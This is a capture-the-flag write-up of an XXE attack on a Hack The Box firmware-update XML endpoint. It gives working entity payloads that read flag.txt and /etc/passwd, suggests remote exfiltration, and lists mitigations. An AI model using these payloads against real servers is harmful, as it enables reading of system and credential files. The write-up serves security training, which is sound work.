# Jailbreak Challenge

## Overview

In this challenge, we successfully exploited an **XML External Entity (XXE)** vulnerability to access a restricted file. The website uses XML for firmware updates, and by modifying the XML payload, we were able to include an external entity that pointed to the flag file.

---

## Original XML Payload

The original XML payload submitted to the website:

```xml
<FirmwareUpdateConfig>
    <Firmware>
        <Version>1.33.7</Version>
        <ReleaseDate>2077-10-21</ReleaseDate>
        <Description>Update includes advanced biometric lock functionality for enhanced security.</Description>
        <Checksum type="SHA-256">9b74c9897bac770ffc029102a200c5de</Checksum>
    </Firmware>
    <Components>
        <Component name="navigation">
            <Version>3.7.2</Version>
            <Description>Updated GPS algorithms for improved wasteland navigation.</Description>
            <Checksum type="SHA-256">e4d909c290d0fb1ca068ffaddf22cbd0</Checksum>
        </Component>
        <Component name="communication">
            <Version>4.5.1</Version>
            <Description>Enhanced encryption for secure communication channels.</Description>
            <Checksum type="SHA-256">88d862aeb067278155c67a6d6c0f3729</Checksum>
        </Component>
        <Component name="biometric_security">
            <Version>2.0.5</Version>
            <Description>Introduces facial recognition and fingerprint scanning for access control.</Description>
            <Checksum type="SHA-256">abcdef1234567890abcdef1234567890</Checksum>
        </Component>
    </Components>
    <UpdateURL>https://satellite-updates.hackthebox.org/firmware/1.33.7/download</UpdateURL>
</FirmwareUpdateConfig>
```

---

## Modified XML Payload with XXE

To exploit the XXE vulnerability, we injected an external entity definition to access the `flag.txt` file:

```xml
<!DOCTYPE email [
  <!ENTITY flag SYSTEM "file:///flag.txt">
]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>&flag;</Version>
        <ReleaseDate>2077-10-21</ReleaseDate>
        <Description>Update includes advanced biometric lock functionality for enhanced security.</Description>
        <Checksum type="SHA-256">9b74c9897bac770ffc029102a200c5de</Checksum>
    </Firmware>
    <Components>
        <Component name="navigation">
            <Version>3.7.2</Version>
            <Description>Updated GPS algorithms for improved wasteland navigation.</Description>
            <Checksum type="SHA-256">e4d909c290d0fb1ca068ffaddf22cbd0</Checksum>
        </Component>
        <Component name="communication">
            <Version>4.5.1</Version>
            <Description>Enhanced encryption for secure communication channels.</Description>
            <Checksum type="SHA-256">88d862aeb067278155c67a6d6c0f3729</Checksum>
        </Component>
        <Component name="biometric_security">
            <Version>2.0.5</Version>
            <Description>Introduces facial recognition and fingerprint scanning for access control.</Description>
            <Checksum type="SHA-256">abcdef1234567890abcdef1234567890</Checksum>
        </Component>
    </Components>
    <UpdateURL>https://satellite-updates.hackthebox.org/firmware/1.33.7/download</UpdateURL>
</FirmwareUpdateConfig>
```

---

## Response

The server processed the injected XML and replaced `&flag;` with the contents of `flag.txt`, returning the flag in the response.

### Flag Output

```
HTB{example_flag_contents_here}
```

---

## Enhancing the Payload

To make the attack more versatile and subtle, we can:

1. Use additional entities to chain file reads for enumerating the system.
2. Redirect the external entity to a remote server to exfiltrate data.

### Example Enhanced Payload

```xml
<!DOCTYPE email [
  <!ENTITY file SYSTEM "file:///etc/passwd">
  <!ENTITY flag SYSTEM "file:///flag.txt">
]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>&flag;</Version>
        <ReleaseDate>2077-10-21</ReleaseDate>
        <Description>&file;</Description>
        <Checksum type="SHA-256">9b74c9897bac770ffc029102a200c5de</Checksum>
    </Firmware>
    <Components>
        <Component name="navigation">
            <Version>3.7.2</Version>
            <Description>Updated GPS algorithms for improved wasteland navigation.</Description>
            <Checksum type="SHA-256">e4d909c290d0fb1ca068ffaddf22cbd0</Checksum>
        </Component>
        <Component name="communication">
            <Version>4.5.1</Version>
            <Description>Enhanced encryption for secure communication channels.</Description>
            <Checksum type="SHA-256">88d862aeb067278155c67a6d6c0f3729</Checksum>
        </Component>
        <Component name="biometric_security">
            <Version>2.0.5</Version>
            <Description>Introduces facial recognition and fingerprint scanning for access control.</Description>
            <Checksum type="SHA-256">abcdef1234567890abcdef1234567890</Checksum>
        </Component>
    </Components>
    <UpdateURL>https://satellite-updates.hackthebox.org/firmware/1.33.7/download</UpdateURL>
</FirmwareUpdateConfig>
```

This payload retrieves the `/etc/passwd` file and embeds its content in the `<Description>` field.

---

## Mitigation Strategies

To prevent XXE attacks, the following measures should be implemented:

1. **Disable DTD Processing**: Configure the XML parser to disable external entity processing.
2. **Input Validation**: Validate and sanitize user inputs.
3. **Use Secure Libraries**: Employ libraries and parsers with secure default configurations.
4. **Audit Dependencies**: Regularly update and audit XML libraries.

---

## Skills Gained

1. Understanding and exploiting **XXE vulnerabilities**.
2. Crafting XML payloads for information disclosure and enumeration.
3. Implementing secure configurations to mitigate XXE attacks.
